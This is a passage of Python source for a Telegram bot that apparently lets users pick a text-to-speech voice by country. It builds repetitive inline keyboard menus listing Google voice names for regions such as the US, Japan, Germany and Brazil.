        item41 = types.InlineKeyboardButton("en-US-Neural2-E",callback_data="en-US-Neural2-E")
        item42 = types.InlineKeyboardButton("en-US-Neural2-F",callback_data="en-US-Neural2-F")
        item43 = types.InlineKeyboardButton("en-US-Neural2-G",callback_data="en-US-Neural2-G")
        item44 = types.InlineKeyboardButton("en-US-Neural2-H",callback_data="en-US-Neural2-H")
        item45 = types.InlineKeyboardButton("en-US-Neural2-I",callback_data="en-US-Neural2-I")
        item46 = types.InlineKeyboardButton("en-US-Neural2-J",callback_data="en-US-Neural2-J")
        item47 = types.InlineKeyboardButton("en-US-Polyglot-1",callback_data="en-US-Polyglot-1")
        item48 = types.InlineKeyboardButton("es-US-Neural2-A",callback_data="es-US-Neural2-A")
        item49 = types.InlineKeyboardButton("es-US-Neural2-B",callback_data="es-US-Neural2-B")
        item50 = types.InlineKeyboardButton("es-US-Neural2-C",callback_data="es-US-Neural2-C")
        item51 = types.InlineKeyboardButton("es-US-Polyglot-1",callback_data="es-US-Polyglot-1")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,item17,item18,item19,item20,item21,item22,item23,item24,item25,item26,item27,item28,item29,item30,item31,item32,item33,item34,item35,item36,item37,item38,item39,item40,item41,item42,item43,item44,item45,item46,item47,item48,item49,item50,item51,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇺🇸 Available Voice/Languages In Country	Unites States 🇺🇸')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "JP":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("ja-JP-Standard-A",callback_data="ja-JP-Standard-A")
        item2 = types.InlineKeyboardButton("ja-JP-Standard-B",callback_data="ja-JP-Standard-B")
        item3 = types.InlineKeyboardButton("ja-JP-Standard-C",callback_data="ja-JP-Standard-C")
        item4 = types.InlineKeyboardButton("ja-JP-Standard-D",callback_data="ja-JP-Standard-D")
        item5 = types.InlineKeyboardButton("ja-JP-Wavenet-B",callback_data="ja-JP-Wavenet-B")
        item6 = types.InlineKeyboardButton("ja-JP-Wavenet-C",callback_data="ja-JP-Wavenet-C")
        item7 = types.InlineKeyboardButton("ja-JP-Wavenet-D",callback_data="ja-JP-Wavenet-D")
        item8 = types.InlineKeyboardButton("ja-JP-Wavenet-A",callback_data="ja-JP-Wavenet-A")
        item9 = types.InlineKeyboardButton("ja-JP-Neural2-B",callback_data="ja-JP-Neural2-B")
        item10 = types.InlineKeyboardButton("ja-JP-Neural2-C",callback_data="ja-JP-Neural2-C")
        item11 = types.InlineKeyboardButton("ja-JP-Neural2-D",callback_data="ja-JP-Neural2-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇯🇵 Available Voice/Languages In Japan 🇯🇵')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "BE":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("nl-BE-Standard-A",callback_data="nl-BE-Standard-A")
        item2 = types.InlineKeyboardButton("nl-BE-Standard-B",callback_data="nl-BE-Standard-B")
        item3 = types.InlineKeyboardButton("nl-BE-Wavenet-A",callback_data="nl-BE-Wavenet-A")
        item4 = types.InlineKeyboardButton("nl-BE-Wavenet-B",callback_data="nl-BE-Wavenet-B")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇧🇪 Available Voice/Languages In Belgium 🇧🇪')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "ZA":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("af-ZA-Standard-A",callback_data="af-ZA-Standard-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= '🇿🇦 Available Voice/Languages In South Africa 🇿🇦') 
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "XA":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("ar-XA-Standard-A",callback_data="ar-XA-Standard-A")
        item2 = types.InlineKeyboardButton("ar-XA-Standard-B",callback_data="ar-XA-Standard-B")
        item3 = types.InlineKeyboardButton("ar-XA-Standard-C",callback_data="ar-XA-Standard-C")
        item4 = types.InlineKeyboardButton("ar-XA-Standard-D",callback_data="ar-XA-Standard-D")
        item5 = types.InlineKeyboardButton("ar-XA-Wavenet-A",callback_data="ar-XA-Wavenet-A")
        item6 = types.InlineKeyboardButton("ar-XA-Wavenet-B",callback_data="ar-XA-Wavenet-B")
        item7 = types.InlineKeyboardButton("ar-XA-Wavenet-C",callback_data="ar-XA-Wavenet-C")
        item8 = types.InlineKeyboardButton("ar-XA-Wavenet-D",callback_data="ar-XA-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In XA ') 
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "BG":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("bg-BG-Standard-A",callback_data="bg-BG-Standard-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In BG')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "CZ":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("cs-CZ-Standard-A",callback_data="cs-CZ-Standard-A")
        item2 = types.InlineKeyboardButton("cs-CZ-Wavenet-A",callback_data="cs-CZ-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In CZ')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "DK":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("da-DK-Standard-C",callback_data="da-DK-Standard-C")
        item2 = types.InlineKeyboardButton("da-DK-Standard-D",callback_data="da-DK-Standard-D")
        item3 = types.InlineKeyboardButton("da-DK-Standard-E",callback_data="da-DK-Standard-E")
        item4 = types.InlineKeyboardButton("da-DK-Standard-A",callback_data="da-DK-Standard-A")
        item5 = types.InlineKeyboardButton("da-DK-Wavenet-C",callback_data="da-DK-Wavenet-C")
        item6 = types.InlineKeyboardButton("da-DK-Wavenet-D",callback_data="da-DK-Wavenet-D")
        item7 = types.InlineKeyboardButton("da-DK-Wavenet-E",callback_data="da-DK-Wavenet-E")
        item8 = types.InlineKeyboardButton("da-DK-Wavenet-A",callback_data="da-DK-Wavenet-A")
        item9 = types.InlineKeyboardButton("da-DK-Neural2-D",callback_data="da-DK-Neural2-D")
        item10 = types.InlineKeyboardButton("da-DK-Neural2-F",callback_data="da-DK-Neural2-F")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In DK')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "DE":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("de-DE-Standard-A",callback_data="de-DE-Standard-A")
        item2 = types.InlineKeyboardButton("de-DE-Standard-B",callback_data="de-DE-Standard-B")
        item3 = types.InlineKeyboardButton("de-DE-Standard-C",callback_data="de-DE-Standard-C")
        item4 = types.InlineKeyboardButton("de-DE-Standard-D",callback_data="de-DE-Standard-D")
        item5 = types.InlineKeyboardButton("de-DE-Standard-E",callback_data="de-DE-Standard-E")
        item6 = types.InlineKeyboardButton("de-DE-Standard-F",callback_data="de-DE-Standard-F")
        item7 = types.InlineKeyboardButton("de-DE-Wavenet-F",callback_data="de-DE-Wavenet-F")
        item8 = types.InlineKeyboardButton("de-DE-Wavenet-A",callback_data="de-DE-Wavenet-A")
        item9 = types.InlineKeyboardButton("de-DE-Wavenet-B",callback_data="de-DE-Wavenet-B")
        item10 = types.InlineKeyboardButton("de-DE-Wavenet-C",callback_data="de-DE-Wavenet-C")
        item11 = types.InlineKeyboardButton("de-DE-Wavenet-D",callback_data="de-DE-Wavenet-D")
        item12 = types.InlineKeyboardButton("de-DE-Wavenet-E",callback_data="de-DE-Wavenet-E")
        item13 = types.InlineKeyboardButton("de-DE-Neural2-B",callback_data="de-DE-Neural2-B")
        item14 = types.InlineKeyboardButton("de-DE-Neural2-C",callback_data="de-DE-Neural2-C")
        item15 = types.InlineKeyboardButton("de-DE-Neural2-D",callback_data="de-DE-Neural2-D")
        item16 = types.InlineKeyboardButton("de-DE-Neural2-F",callback_data="de-DE-Neural2-F")
        item17 = types.InlineKeyboardButton("de-DE-Polyglot-1",callback_data="de-DE-Polyglot-1")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,item17,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In DE')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "AU":  
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("en-AU-Standard-A",callback_data="en-AU-Standard-A")
        item2 = types.InlineKeyboardButton("en-AU-Standard-B",callback_data="en-AU-Standard-B")
        item3 = types.InlineKeyboardButton("en-AU-Standard-C",callback_data="en-AU-Standard-C")
        item4 = types.InlineKeyboardButton("en-AU-Standard-D",callback_data="en-AU-Standard-D")
        item5 = types.InlineKeyboardButton("en-AU-News-E",callback_data="en-AU-News-E")
        item6 = types.InlineKeyboardButton("en-AU-News-F",callback_data="en-AU-News-F")
        item7 = types.InlineKeyboardButton("en-AU-News-G",callback_data="en-AU-News-G")
        item8 = types.InlineKeyboardButton("en-AU-Wavenet-A",callback_data="en-AU-Wavenet-A")
        item9 = types.InlineKeyboardButton("en-AU-Wavenet-B",callback_data="en-AU-Wavenet-B")
        item10 = types.InlineKeyboardButton("en-AU-Wavenet-C",callback_data="en-AU-Wavenet-C")
        item11 = types.InlineKeyboardButton("en-AU-Wavenet-D",callback_data="en-AU-Wavenet-D")
        item12 = types.InlineKeyboardButton("en-AU-Neural2-A",callback_data="en-AU-Neural2-A")
        item13 = types.InlineKeyboardButton("en-AU-Neural2-B",callback_data="en-AU-Neural2-B")
        item14 = types.InlineKeyboardButton("en-AU-Neural2-C",callback_data="en-AU-Neural2-C")
        item15 = types.InlineKeyboardButton("en-AU-Neural2-D",callback_data="en-AU-Neural2-D")
        item16 = types.InlineKeyboardButton("en-AU-Polyglot-1",callback_data="en-AU-Polyglot-1")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In AU')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)    
    elif call.data == "GB":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("en-GB-Standard-A",callback_data="en-GB-Standard-A")
        item2 = types.InlineKeyboardButton("en-GB-Standard-B",callback_data="en-GB-Standard-B")
        item3 = types.InlineKeyboardButton("en-GB-Standard-C",callback_data="en-GB-Standard-C")
        item4 = types.InlineKeyboardButton("en-GB-Standard-D",callback_data="en-GB-Standard-D")
        item5 = types.InlineKeyboardButton("en-GB-Standard-F",callback_data="en-GB-Standard-F")
        item6 = types.InlineKeyboardButton("en-GB-News-G",callback_data="en-GB-News-G")
        item7 = types.InlineKeyboardButton("en-GB-News-H",callback_data="en-GB-News-H")
        item8 = types.InlineKeyboardButton("en-GB-News-I",callback_data="en-GB-News-I")
        item9 = types.InlineKeyboardButton("en-GB-News-J",callback_data="en-GB-News-J")
        item10 = types.InlineKeyboardButton("en-GB-News-K",callback_data="en-GB-News-K")
        item11 = types.InlineKeyboardButton("en-GB-News-L",callback_data="en-GB-News-L")
        item12 = types.InlineKeyboardButton("en-GB-News-M",callback_data="en-GB-News-M")
        item13 = types.InlineKeyboardButton("en-GB-Wavenet-A",callback_data="en-GB-Wavenet-A")
        item14 = types.InlineKeyboardButton("en-GB-Wavenet-B",callback_data="en-GB-Wavenet-B")
        item15 = types.InlineKeyboardButton("en-GB-Wavenet-C",callback_data="en-GB-Wavenet-C")
        item16 = types.InlineKeyboardButton("en-GB-Wavenet-D",callback_data="en-GB-Wavenet-D")
        item17 = types.InlineKeyboardButton("en-GB-Wavenet-F",callback_data="en-GB-Wavenet-F")
        item18 = types.InlineKeyboardButton("en-GB-Neural2-A",callback_data="en-GB-Neural2-A")
        item19 = types.InlineKeyboardButton("en-GB-Neural2-B",callback_data="en-GB-Neural2-B")
        item20 = types.InlineKeyboardButton("en-GB-Neural2-C",callback_data="en-GB-Neural2-C")
        item21 = types.InlineKeyboardButton("en-GB-Neural2-D",callback_data="en-GB-Neural2-D")

        item22 = types.InlineKeyboardButton("en-GB-Neural2-F",callback_data="en-GB-Neural2-F")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,item17,item18,item19,item20,item21,item22,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In GB')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "FI":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("fi-FI-Standard-A",callback_data="fi-FI-Standard-A")
        item2 = types.InlineKeyboardButton("fi-FI-Wavenet-A",callback_data="fi-FI-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In FI')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "CA":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("fr-CA-Standard-A",callback_data="fr-CA-Standard-A")
        item2 = types.InlineKeyboardButton("fr-CA-Standard-B",callback_data="fr-CA-Standard-B")
        item3 = types.InlineKeyboardButton("fr-CA-Standard-C",callback_data="fr-CA-Standard-C")
        item4 = types.InlineKeyboardButton("fr-CA-Standard-D",callback_data="fr-CA-Standard-D")
        item5 = types.InlineKeyboardButton("fr-CA-Wavenet-A",callback_data="fr-CA-Wavenet-A")
        item6 = types.InlineKeyboardButton("fr-CA-Wavenet-B",callback_data="fr-CA-Wavenet-B")
        item7 = types.InlineKeyboardButton("fr-CA-Wavenet-C",callback_data="fr-CA-Wavenet-C")
        item8 = types.InlineKeyboardButton("fr-CA-Wavenet-D",callback_data="fr-CA-Wavenet-D")
        item9 = types.InlineKeyboardButton("fr-CA-Neural2-A",callback_data="fr-CA-Neural2-A")
        item10 = types.InlineKeyboardButton("fr-CA-Neural2-B",callback_data="fr-CA-Neural2-B")
        item11 = types.InlineKeyboardButton("fr-CA-Neural2-C",callback_data="fr-CA-Neural2-C")
        item12 = types.InlineKeyboardButton("fr-CA-Neural2-D",callback_data="fr-CA-Neural2-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In CA')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "FR":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("fr-FR-Standard-A",callback_data="fr-FR-Standard-A")
        item2 = types.InlineKeyboardButton("fr-FR-Standard-B",callback_data="fr-FR-Standard-B")
        item3 = types.InlineKeyboardButton("fr-FR-Standard-C",callback_data="fr-FR-Standard-C")
        item4 = types.InlineKeyboardButton("fr-FR-Standard-D",callback_data="fr-FR-Standard-D")
        item5 = types.InlineKeyboardButton("fr-FR-Standard-E",callback_data="fr-FR-Standard-E")
        item6 = types.InlineKeyboardButton("fr-FR-Wavenet-E",callback_data="fr-FR-Wavenet-E")
        item7 = types.InlineKeyboardButton("fr-FR-Wavenet-A",callback_data="fr-FR-Wavenet-A")
        item8 = types.InlineKeyboardButton("fr-FR-Wavenet-B",callback_data="fr-FR-Wavenet-B")
        item9 = types.InlineKeyboardButton("fr-FR-Wavenet-C",callback_data="fr-FR-Wavenet-C")
        item10 = types.InlineKeyboardButton("fr-FR-Wavenet-D",callback_data="fr-FR-Wavenet-D")
        item11 = types.InlineKeyboardButton("fr-FR-Neural2-A",callback_data="fr-FR-Neural2-A")
        item12 = types.InlineKeyboardButton("fr-FR-Neural2-B",callback_data="fr-FR-Neural2-B")
        item13 = types.InlineKeyboardButton("fr-FR-Neural2-C",callback_data="fr-FR-Neural2-C")
        item14 = types.InlineKeyboardButton("fr-FR-Neural2-D",callback_data="fr-FR-Neural2-D")
        item15 = types.InlineKeyboardButton("fr-FR-Neural2-E",callback_data="fr-FR-Neural2-E")
        item16 = types.InlineKeyboardButton("fr-FR-Polyglot-1",callback_data="fr-FR-Polyglot-1")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,item11,item12,item13,item14,item15,item16,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In FR')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "IL":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("he-IL-Standard-D",callback_data="he-IL-Standard-D")
        item2 = types.InlineKeyboardButton("he-IL-Standard-A",callback_data="he-IL-Standard-A")
        item3 = types.InlineKeyboardButton("he-IL-Standard-B",callback_data="he-IL-Standard-B")
        item4 = types.InlineKeyboardButton("he-IL-Standard-C",callback_data="he-IL-Standard-C")
        item5 = types.InlineKeyboardButton("he-IL-Wavenet-D",callback_data="he-IL-Wavenet-D")
        item6 = types.InlineKeyboardButton("he-IL-Wavenet-A",callback_data="he-IL-Wavenet-A")
        item7 = types.InlineKeyboardButton("he-IL-Wavenet-B",callback_data="he-IL-Wavenet-B")
        item8 = types.InlineKeyboardButton("he-IL-Wavenet-C",callback_data="he-IL-Wavenet-C")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In IL')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "HU":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("hu-HU-Standard-A",callback_data="hu-HU-Standard-A")
        item2 = types.InlineKeyboardButton("hu-HU-Wavenet-A",callback_data="hu-HU-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In HU')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "IS":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("is-IS-Standard-A",callback_data="is-IS-Standard-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In IS')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "LT":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("lt-LT-Standard-A",callback_data="lt-LT-Standard-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In LT')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)  
    elif call.data == "LV":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("lv-LV-Standard-A",callback_data="lv-LV-Standard-A")
        updated_keyboard.add(item1)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In LV')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "MY":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("ms-MY-Standard-A",callback_data="ms-MY-Standard-A")
        item2 = types.InlineKeyboardButton("ms-MY-Standard-B",callback_data="ms-MY-Standard-B")
        item3 = types.InlineKeyboardButton("ms-MY-Standard-C",callback_data="ms-MY-Standard-C")
        item4 = types.InlineKeyboardButton("ms-MY-Standard-D",callback_data="ms-MY-Standard-D")
        item5 = types.InlineKeyboardButton("ms-MY-Wavenet-A",callback_data="ms-MY-Wavenet-A")
        item6 = types.InlineKeyboardButton("ms-MY-Wavenet-B",callback_data="ms-MY-Wavenet-B")
        item7 = types.InlineKeyboardButton("ms-MY-Wavenet-C",callback_data="ms-MY-Wavenet-C")
        item8 = types.InlineKeyboardButton("ms-MY-Wavenet-D",callback_data="ms-MY-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In MY')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "NO":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("nb-NO-Standard-A",callback_data="nb-NO-Standard-A")
        item2 = types.InlineKeyboardButton("nb-NO-Standard-B",callback_data="nb-NO-Standard-B")
        item3 = types.InlineKeyboardButton("nb-NO-Standard-E",callback_data="nb-NO-Standard-E")
        item4 = types.InlineKeyboardButton("nb-NO-Standard-C",callback_data="nb-NO-Standard-C")
        item5 = types.InlineKeyboardButton("nb-NO-Standard-D",callback_data="nb-NO-Standard-D")
        item6 = types.InlineKeyboardButton("nb-NO-Wavenet-A",callback_data="nb-NO-Wavenet-A")
        item7 = types.InlineKeyboardButton("nb-NO-Wavenet-B",callback_data="nb-NO-Wavenet-B")
        item8 = types.InlineKeyboardButton("nb-NO-Wavenet-C",callback_data="nb-NO-Wavenet-C")
        item9 = types.InlineKeyboardButton("nb-NO-Wavenet-D",callback_data="nb-NO-Wavenet-D")
        item10 = types.InlineKeyboardButton("nb-NO-Wavenet-E",callback_data="nb-NO-Wavenet-E")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In NO')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "NL":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("nl-NL-Standard-B",callback_data="nl-NL-Standard-B")
        item2 = types.InlineKeyboardButton("nl-NL-Standard-C",callback_data="nl-NL-Standard-C")
        item3 = types.InlineKeyboardButton("nl-NL-Standard-D",callback_data="nl-NL-Standard-D")
        item4 = types.InlineKeyboardButton("nl-NL-Standard-A",callback_data="nl-NL-Standard-A")
        item5 = types.InlineKeyboardButton("nl-NL-Standard-E",callback_data="nl-NL-Standard-E")
        item6 = types.InlineKeyboardButton("nl-NL-Wavenet-B",callback_data="nl-NL-Wavenet-B")
        item7 = types.InlineKeyboardButton("nl-NL-Wavenet-C",callback_data="nl-NL-Wavenet-C")
        item8 = types.InlineKeyboardButton("nl-NL-Wavenet-D",callback_data="nl-NL-Wavenet-D")
        item9 = types.InlineKeyboardButton("nl-NL-Wavenet-A",callback_data="nl-NL-Wavenet-A")
        item10 = types.InlineKeyboardButton("nl-NL-Wavenet-E",callback_data="nl-NL-Wavenet-E")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,item10,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In NL')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)

    elif call.data == "BR":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("pt-BR-Standard-A",callback_data="pt-BR-Standard-A")
        item2 = types.InlineKeyboardButton("pt-BR-Standard-B",callback_data="pt-BR-Standard-B")
        item3 = types.InlineKeyboardButton("pt-BR-Standard-C",callback_data="pt-BR-Standard-C")
        item4 = types.InlineKeyboardButton("pt-BR-Wavenet-A",callback_data="pt-BR-Wavenet-A")
        item5 = types.InlineKeyboardButton("pt-BR-Wavenet-B",callback_data="pt-BR-Wavenet-B")
        item6 = types.InlineKeyboardButton("pt-BR-Wavenet-C",callback_data="pt-BR-Wavenet-C")
        item7 = types.InlineKeyboardButton("pt-BR-Neural2-A",callback_data="pt-BR-Neural2-A")
        item8 = types.InlineKeyboardButton("pt-BR-Neural2-B",callback_data="pt-BR-Neural2-B")
        item9 = types.InlineKeyboardButton("pt-BR-Neural2-C",callback_data="pt-BR-Neural2-C")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,item9,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In BR')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "PT":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("pt-PT-Standard-A",callback_data="pt-PT-Standard-A")
        item2 = types.InlineKeyboardButton("pt-PT-Standard-B",callback_data="pt-PT-Standard-B")
        item3 = types.InlineKeyboardButton("pt-PT-Standard-C",callback_data="pt-PT-Standard-C")
        item4 = types.InlineKeyboardButton("pt-PT-Standard-D",callback_data="pt-PT-Standard-D")
        item5 = types.InlineKeyboardButton("pt-PT-Wavenet-A",callback_data="pt-PT-Wavenet-A")
        item6 = types.InlineKeyboardButton("pt-PT-Wavenet-B",callback_data="pt-PT-Wavenet-B")
        item7 = types.InlineKeyboardButton("pt-PT-Wavenet-C",callback_data="pt-PT-Wavenet-C")
        item8 = types.InlineKeyboardButton("pt-PT-Wavenet-D",callback_data="pt-PT-Wavenet-D")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,item3,item4,item5,item6,item7,item8,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In PT')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "RO":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
        item1 = types.InlineKeyboardButton("ro-RO-Standard-A",callback_data="ro-RO-Standard-A")
        item2 = types.InlineKeyboardButton("ro-RO-Wavenet-A",callback_data="ro-RO-Wavenet-A")
        back =types.InlineKeyboardButton("Back",callback_data="back")
        updated_keyboard.add(item1,item2,back)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text= ' Available Voice/Languages In RO')
        bot.edit_message_reply_markup(chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=updated_keyboard)
    elif call.data == "RU":
        updated_keyboard = telebot.types.InlineKeyboardMarkup()
